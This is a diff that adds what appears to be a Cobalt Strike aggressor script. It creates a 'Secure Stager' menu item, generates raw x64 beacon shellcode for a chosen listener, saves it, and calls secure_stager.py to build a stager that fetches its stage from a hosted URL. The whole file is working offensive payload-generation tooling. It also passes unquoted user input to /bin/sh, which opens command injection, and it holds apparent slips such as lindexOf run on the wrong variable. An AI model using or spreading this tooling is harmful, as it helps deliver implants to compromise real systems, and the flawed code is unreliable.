@@ -1,0 +1,91 @@
+global('$listener $filename $shellcode $script')
+
+#This function executes system commands and retrieves/parses the output. 
+sub ExecuteCmd
+{
+    local('$command $output $data');
+    $command = $1;
+
+    #Append instructions to command to redirect stderr to processStdout
+    $command = $command . " 2>&1";
+    
+    #Run command in a subshell to redirect stderr -> processStdout
+    $data = exec(@("/bin/sh", "-c", $command));
+
+    if($debug == 1)
+    {
+        println("Debug: " . $command);       
+    }
+
+    $output = join("\n", readAll($data));
+
+    return $output;
+}
+
+popup payloads 
+{
+    item "Secure Stager" 
+    {
+        local('$dialog %defaults');
+           
+        # create our dialog
+        $dialog = dialog("Secure Stager Generation", %defaults, &gen_shellcode);
+        dialog_description($dialog, "Select a listener to generate an x64 secure stager for. Specify the URL that the stage will be hosted at (e.g. https://mycooldomain.com/important.bin)");      
+        drow_listener_stage($dialog, "listener", "(*) Listener: ");
+        drow_text($dialog, "stage_url", "(*) URL for hosted stage: ");   
+        dbutton_action($dialog, "Save");
+
+        # show our dialog      
+        dialog_show($dialog);   
+    }
+}
+
+sub gen_secure_stager 
+{
+    local('$command $output')
+    # Validate no space exists in url
+    if(" " isin $1)
+    {
+        show_error("Filename cannot have spaces!");
+        exit();
+    }
+
+    # Write shellcode to disk
+    $handle = openf("> $+ $1");
+    writeb($handle, $shellcode);
+    closef($handle);
+
+    # Set $filename to whatever was actually used by save prompt
+    $filename = $1;
+
+    # Call secure_stager.py to generate secure stager
+    $command = "$script $filename $stage_url";
+    $output = ExecuteCmd($command);
+
+    # If secure_stager.py failed, delete original shellcode file
+    if('[-]' isin $output)
+    {
+        deleteFile($filename);
+    }
+
+    # Print info to console just in case
+    println("\n$output");
+
+    # Pop window with output
+    show_message("$output\n\nThis information is also available in the script console.");
+}
+
+sub gen_shellcode 
+{
+    # Set global variables
+    $listener = $3['listener'];
+    $filename = substr($3['stage_url'], lindexOf($3['listener'], "/"));
+    $stage_url = $3['stage_url'];
+    $script = script_resource("../secure_stager.py");
+
+    # Generate shellcode using selected listener
+    $shellcode = artifact_payload($3['listener'], "raw", "x64", "process", "None");
+
+    # Save shellcode to disk 
+    prompt_file_save($filename, &gen_secure_stager);
+}
